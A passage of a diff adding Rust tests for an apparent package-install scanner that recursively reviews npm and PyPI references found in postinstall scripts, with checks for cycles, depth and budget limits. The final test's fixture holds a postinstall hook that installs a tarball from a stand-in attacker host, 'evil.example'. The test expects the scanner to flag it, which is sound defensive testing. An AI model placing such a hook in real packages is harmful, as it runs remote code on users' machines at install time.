+            r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install SPECS"}}"#
+                .replace("SPECS", &many);
+        let mut packages: Vec<(&str, &str)> = vec![("a@1.0.0", script.as_str())];
+        packages.extend(specs.iter().map(|(k, v)| (k.as_str(), v.as_str())));
+        let (verdict, _) = evaluate_test(&packages, "a@1.0.0", &policy);
+        assert_eq!(verdict.recursive.len(), 8, "budget bounds children");
+        let cap = verdict
+            .findings
+            .iter()
+            .find(|f| f.title == "Install-reference cap exceeded")
+            .expect("overflow must be disclosed");
+        assert_eq!(cap.severity, crate::verdict::VerdictBand::High);
+        assert!(cap.description.contains("33"), "{cap:?}");
+    }
+
+    #[test]
+    fn review_children_maps_pkgbuild_refs_to_npm_and_pip_refs_to_pypi() {
+        let policy = no_advisory_policy();
+        let store_dir = tempfile::tempdir().unwrap();
+        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
+        let mut ctx = ReviewContext::new(&policy, fixture_bases());
+        ctx.inject_registry(
+            Ecosystem::Npm,
+            std::rc::Rc::new(FakeRegistry::new(&[(
+                "npm-pkg@1.0.0",
+                r#"{"name":"npm-pkg","version":"1.0.0"}"#,
+            )])),
+        );
+        ctx.inject_registry(
+            Ecosystem::PyPi,
+            std::rc::Rc::new(FakePyPI::new(&[("pip-pkg==1.0.0")])),
+        );
+        let pkgbuild_ref = crate::install_ref::raw_ref(
+            crate::install_ref::RefOrigin::Pkgbuild {
+                function: "build".to_string(),
+            },
+            crate::install_ref::RefManager::Npm,
+            "npm-pkg@1.0.0",
+        );
+        let pip_ref = crate::install_ref::raw_ref(
+            crate::install_ref::RefOrigin::WheelDataScript {
+                path: "pkg-1.0.data/scripts/setup".to_string(),
+            },
+            crate::install_ref::RefManager::Pip,
+            "pip-pkg==1.0.0",
+        );
+        let (children, findings) = ctx.review_children(&[pkgbuild_ref, pip_ref], &store, &policy);
+        assert!(findings.is_empty(), "{findings:?}");
+        assert_eq!(children.len(), 2);
+        assert_eq!(children[0].ecosystem, Ecosystem::Npm);
+        assert_eq!(children[0].chain[0], "npm:npm-pkg@1.0.0");
+        assert_eq!(children[1].ecosystem, Ecosystem::PyPi);
+        assert_eq!(children[1].chain[0], "pypi:pip-pkg@1.0.0");
+    }
+
+    #[test]
+    fn cycle_is_cut_and_rolled_up() {
+        let policy = no_advisory_policy();
+        let (verdict, _) = evaluate_test(
+            &[
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
+                ),
+                (
+                    "b@1.0.0",
+                    r#"{"name":"b","version":"1.0.0","scripts":{"postinstall":"npm install a@1.0.0"}}"#,
+                ),
+            ],
+            "a@1.0.0",
+            &policy,
+        );
+        assert_eq!(verdict.recursive.len(), 1, "no runaway recursion");
+        let child = &verdict.recursive[0];
+        assert!(
+            child
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R26_RECURSION_CYCLE"),
+            "cycle must surface in the child findings: {:?}",
+            child
+                .findings
+                .iter()
+                .map(|f| &f.rule_id)
+                .collect::<Vec<_>>()
+        );
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R27_SECOND_ORDER"),
+            "child HIGH cycle must roll up: {:?}",
+            verdict
+                .findings
+                .iter()
+                .map(|f| (&f.rule_id, &f.severity))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn second_visit_reuses_memo_without_refetch() {
+        let policy = no_advisory_policy();
+        let (verdict, fetches) = evaluate_test(
+            &[
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0","prepare":"npm install b@1.0.0"}}"#,
+                ),
+                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
+            ],
+            "a@1.0.0",
+            &policy,
+        );
+        assert_eq!(verdict.recursive.len(), 2);
+        assert_eq!(verdict.recursive[0].chain, verdict.recursive[1].chain);
+        // Exactly two downloads: a's target tarball plus b's tarball on
+        // its first child review. The second reference to b must hit the
+        // memo, not re-download (naive re-review would fetch three times).
+        assert_eq!(fetches, 2, "memo must prevent re-downloads");
+    }
+
+    #[test]
+    fn child_budget_emits_r25_fail_closed() {
+        let mut policy = no_advisory_policy();
+        policy.recursion.max_child_reviews = 1;
+        let (verdict, _) = evaluate_test(
+            &[
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0 c@1.0.0"}}"#,
+                ),
+                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
+                ("c@1.0.0", r#"{"name":"c","version":"1.0.0"}"#),
+            ],
+            "a@1.0.0",
+            &policy,
+        );
+        assert_eq!(verdict.recursive.len(), 1);
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R25_RECURSION_DEPTH")
+        );
+    }
+
+    #[test]
+    fn depth_zero_emits_r25_fail_closed() {
+        let mut policy = no_advisory_policy();
+        policy.recursion.max_depth = 0;
+        let (verdict, _) = evaluate_test(
+            &[
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
+                ),
+                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
+            ],
+            "a@1.0.0",
+            &policy,
+        );
+        assert!(verdict.recursive.is_empty());
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R25_RECURSION_DEPTH")
+        );
+    }
+
+    #[test]
+    fn unpinned_reference_resolves_default_version_at_medium() {
+        let policy = no_advisory_policy();
+        let (verdict, _) = evaluate_test(
+            &[
+                (
+                    "a@1.0.0",
+                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b"}}"#,
+                ),
+                ("b@2.5.0", r#"{"name":"b","version":"2.5.0"}"#),
+            ],
+            "a@1.0.0",
+            &policy,
+        );
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
+                    && f.severity == crate::verdict::VerdictBand::Medium),
+            "unpinned ref must be Medium: {:?}",
+            verdict
+                .findings
+                .iter()
+                .map(|f| (&f.rule_id, &f.severity))
+                .collect::<Vec<_>>()
+        );
+        assert_eq!(verdict.recursive[0].version, "2.5.0");
+    }
+
+    #[test]
+    fn unresolvable_reference_is_disclosed_at_medium() {
+        let policy = no_advisory_policy();
+        let (verdict, _) = evaluate_test(
+            &[(
+                "a@1.0.0",
+                r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install missing-pkg@1.0.0"}}"#,
+            )],
+            "a@1.0.0",
+            &policy,
+        );
+        assert!(verdict.recursive.is_empty());
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
+                    && f.severity == crate::verdict::VerdictBand::Medium
+                    && f.title == "Referenced install could not be resolved"),
+            "unresolvable ref must be disclosed: {:?}",
+            verdict
+                .findings
+                .iter()
+                .map(|f| &f.title)
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn range_reference_is_disclosed_not_guessed() {
+        let policy = no_advisory_policy();
+        let (verdict, _) = evaluate_test(
+            &[(
+                "a@1.0.0",
+                r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@^1.2.0"}}"#,
+            )],
+            "a@1.0.0",
+            &policy,
+        );
+        assert!(verdict.recursive.is_empty());
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
+                    && f.title == "Referenced install could not be resolved"),
+            "range ref must be disclosed: {:?}",
+            verdict
+                .findings
+                .iter()
+                .map(|f| &f.title)
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn non_registry_reference_is_high_and_not_recursed() {
+        let policy = no_advisory_policy();
+        let (verdict, _) = evaluate_test(
+            &[(
+                "a@1.0.0",
+                r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install https://evil.example/x.tgz"}}"#,
+            )],
+            "a@1.0.0",
+            &policy,
+        );
+        assert!(verdict.recursive.is_empty());
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
+                    && f.severity == crate::verdict::VerdictBand::High
+                    && f.title == "Non-registry install reference"),
+            "non-registry ref must be High: {:?}",
+            verdict
+                .findings
+                .iter()
+                .map(|f| (&f.title, &f.severity))
+                .collect::<Vec<_>>()
         );
     }
 }
